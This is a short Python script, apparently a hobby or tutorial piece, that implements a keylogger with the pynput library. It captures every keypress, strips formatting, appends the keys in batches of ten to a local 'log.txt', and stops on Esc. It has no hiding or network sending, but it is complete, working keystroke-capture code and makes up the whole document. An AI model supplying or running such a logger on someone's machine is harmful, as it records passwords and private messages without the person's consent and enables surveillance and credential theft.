from pynput.keyboard import Key, Listener
import matplotlib.pyplot as plt

keys = []


def on_press(e):
    global keys
    keys.append(e)
    if len(keys) >= 10:
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a+") as f:
        for key in keys:
            k = str(key).replace("'", "").replace("Key", "")
            f.write(k)

def on_release(e):
    if e == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
